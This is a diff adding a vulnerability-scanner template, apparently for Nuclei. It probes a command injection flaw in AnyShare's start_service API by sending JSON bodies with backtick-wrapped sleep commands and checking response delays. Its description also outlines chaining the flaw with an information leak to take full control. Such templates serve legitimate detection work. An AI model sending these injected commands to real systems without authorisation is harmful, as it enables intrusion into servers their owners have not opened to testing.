@@ -1,0 +1,36 @@
+id: anyshare-serviceagent-command-injection
+info:
+  name: "爱数AnyShare start_service 接口命令注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    爱数AnyShare智能内容管理平台的/api/ServiceAgent/start_service接口存在命令注入缺陷（CWE-78），攻击者可通过参数污染触发系统命令执行。该漏洞允许利用特殊字符（;、&&等）拼接恶意命令参数，实现未经验证的代码执行。结合已公开的Usrm_GetAllUsers信息泄露漏洞（671317），可构建凭证获取-权限升级-命令注入的攻击路径，最终达成对目标系统的完全控制。
+  tags: 爱数AnyShare
+
+http:
+- raw:
+  - |
+    POST /api/ServiceAgent/start_service HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    Content-Type: application/json
+
+    ["`sleep 5`"]
+  - |
+    POST /api/ServiceAgent/start_service HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    Content-Type: application/json
+
+    ["`sleep 8`"]
+  matchers-condition: and
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
